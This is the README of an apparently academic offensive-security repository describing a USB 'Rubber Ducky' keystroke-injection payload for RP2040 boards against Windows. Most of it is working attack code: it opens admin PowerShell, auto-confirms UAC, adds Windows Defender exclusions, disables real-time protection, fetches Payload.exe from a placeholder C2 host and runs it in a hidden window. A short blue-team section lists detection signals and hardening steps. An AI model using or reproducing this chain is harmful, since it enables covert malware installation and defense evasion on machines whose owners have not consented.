
# 🦆 Rubber Ducky — HID Injection Payload (CircuitPython / RP2040)

> ⚠️ **LEGAL DISCLAIMER** — This code was developed as part of an academic project at **ESGI Paris (2025-2026)**. All tests were conducted on machines we own, in an isolated lab environment. Any use on third-party systems without explicit authorization is illegal (French Penal Code article 323-1 / CFAA in the US). This repository is published for **educational and offensive security research purposes only**.

---

## 📋 Overview

This CircuitPython script turns an **RP2040** board (USB stick form factor) into a **HID Keyboard** device. Once plugged into a Windows target machine, it automatically executes a sequence of keystrokes simulating a human user — in under **5 seconds**.

Full execution chain:
1. Opens a CMD prompt via `Win+R`
2. Launches PowerShell with administrator privileges
3. Automatically confirms the UAC prompt
4. Creates a dedicated folder and adds it to Windows Defender exclusions
5. Downloads a remote payload from the C2 server
6. Executes it silently (`-WindowStyle Hidden`)
7. Closes all open windows

---

## 🔧 Hardware & Software Requirements

### Hardware
| Component | Details |
|---|---|
| Board | **RP2040 USB** (standard USB stick form factor) |
| Target OS | Windows 10 / 11 (FR keyboard layout) |
| Connection | Direct USB-A port |

### CircuitPython Dependencies
```
circuitpython >= 8.x
adafruit_hid >= 6.0.0
  ├── adafruit_hid/keyboard.py
  ├── adafruit_hid/keycode_win_fr.py          ← AZERTY Windows FR layout
  └── adafruit_hid/keyboard_layout_win_fr.py
```

> All libraries are available on the [Adafruit CircuitPython Bundle](https://github.com/adafruit/Adafruit_CircuitPython_Bundle). Copy the `adafruit_hid/` folder into the `/lib` directory of the device.

---

## 📁 Device File Structure

```
CIRCUITPY (D:\)
│
├── code.py                  ← This file (auto entry point)
│
└── lib/
    └── adafruit_hid/
        ├── __init__.mpy
        ├── keyboard.mpy
        ├── keyboard_layout_win_fr.mpy
        └── keycode_win_fr.mpy
```

> CircuitPython automatically executes `code.py` every time the device is plugged in.

---

## 🔬 Code Breakdown

### HID Initialization

```python
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)
time.sleep(2)              # Wait for the OS to recognize the HID device
```

The 2-second delay is critical: it gives the OS enough time to recognize and initialize the board as a legitimate keyboard before sending the first keystrokes.

---

### Step 1 — Open CMD via Win+R

```python
def win_run(command, delay=0.5):
    kbd.press(Keycode.GUI, Keycode.R)   # Win+R shortcut → Run dialog
    kbd.release_all()
    time.sleep(delay)
    layout.write(command)               # Types the command character by character
    kbd.press(Keycode.ENTER)
    kbd.release_all()

win_run("cmd", delay=0.6)
time.sleep(1.5)                         # Wait for the CMD window to fully open
```

**Why `delay=0.6`?** A shorter delay doesn't give the Run dialog enough time to open on slower machines, causing keystrokes to be missed.

---

### Step 2 — PowerShell Elevation (UAC Bypass)

```python
layout.write('powershell -Command "Start-Process powershell -Verb RunAs"')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# UAC dialog navigation: LEFT_ARROW selects "Yes"
kbd.press(Keycode.LEFT_ARROW)
kbd.release_all()
time.sleep(0.3)
kbd.press(Keycode.ENTER)
kbd.release_all()
```

`-Verb RunAs` triggers a UAC elevation prompt. The confirmation is automated via keystroke: on the Windows UAC dialog, `←` followed by `Enter` selects and confirms "Yes".

> **MITRE Technique:** T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control

---

### Step 3 — Environment Setup

```python
layout.write("cd c:\\")         # Navigate to C:\ root
layout.write("mkdir games")     # Create C:\games (inconspicuous name)
layout.write("cd games")        # Move into the folder
```

The folder `C:\games` was chosen for its harmless appearance to an unsuspecting user browsing the filesystem.

---

### Step 4 — Disabling Windows Defender

```python
# Add the folder to AV exclusions
layout.write('Add-MpPreference -ExclusionPath "C:\\games"')

# Exclude the payload process from scanning
layout.write('Add-MpPreference -ExclusionProcess "Payload.exe"')

# Disable real-time protection
layout.write('Set-MpPreference -DisableRealtimeMonitoring $true')
```

These three commands run **before** the payload is downloaded to prevent Defender from automatically quarantining or blocking it on arrival.

> **MITRE Technique:** T1562.001 — Impair Defenses: Disable or Modify Tools

---

### Step 5 — Payload Download & Execution

```python
# Download via wget (PowerShell alias for Invoke-WebRequest)
layout.write("wget http://IP_OF_C2/Payload.exe -O Payload.exe")

# Execute silently in the background
layout.write('Start-Process "C:\\games\\Payload.exe" -WindowStyle Hidden')
```

`-WindowStyle Hidden` prevents any visible window from appearing for the user. The payload then establishes a connection back to the Mythic C2 server.

> **MITRE Techniques:** T1105 (Ingress Tool Transfer) + T1036 (Masquerading)

---

### Step 6 — Cleanup

```python
layout.write("exit")    # Close admin PowerShell
layout.write("exit")    # Close CMD
```

All windows opened during the attack are closed. On an unattended machine, the entire operation leaves no visible trace.

---

## ⏱️ Execution Timeline

```
T+0.0s  → USB plug-in, HID recognition by the OS
T+2.0s  → Script execution starts
T+2.6s  → Win+R → "cmd" → Enter
T+4.1s  → Admin PowerShell launch
T+5.1s  → Automatic UAC confirmation
T+6.1s  → C:\games folder created
T+7.6s  → Defender exclusions added + real-time monitoring disabled
T+9.6s  → Payload.exe downloaded
T+10.6s → Payload.exe executed (hidden window)
T+11.6s → All windows closed
```

**Total visible execution time: ~10 seconds**

---

## 🗺️ MITRE ATT&CK Mapping

| Step | Technique | ID |
|---|---|---|
| HID recognition | Hardware Additions | T1200 |
| CMD / PowerShell launch | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Automatic UAC confirmation | Abuse Elevation Control Mechanism | T1548.002 |
| Defender exclusion | Impair Defenses: Disable or Modify Tools | T1562.001 |
| Payload download | Ingress Tool Transfer | T1105 |
| Hidden execution | Hide Artifacts: Hidden Window | T1564.003 |
| Window cleanup | Obfuscated Files or Information | T1027 |

---

## 🛡️ Detection (Blue Team)

### Sigma Rules
See the [`../detection/sigma_rules/`](../detection/sigma_rules/) folder for detection rules mapped to each technique used in this script.

### Key Detection Signals

| Signal | Detection Tool |
|---|---|
| Unknown HID device plugged in | Sysmon Event ID 6416 |
| `powershell.exe` child of `cmd.exe` with `-Verb RunAs` | Sysmon Event ID 1 |
| `Add-MpPreference -ExclusionPath` in command line | Windows Defender Event ID 5007 |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Windows Defender Event ID 5001 |
| Network connection initiated from `%TEMP%` or `C:\games\` | Sysmon Event ID 3 |
| `wget` / `Invoke-WebRequest` to unknown public IP | Proxy / NGFW logs |

### Hardening Recommendations
- **Whitelist authorized HID devices** via GPO (Device Installation Restrictions)
- **Enable Tamper Protection** in Windows Defender to prevent modification via PowerShell
- **Monitor Event IDs 5001/5007** from Windows Defender in your SIEM
- **Restrict USB access** on sensitive workstations (BIOS policy + organizational policy)

---

Sortie

exit code 0
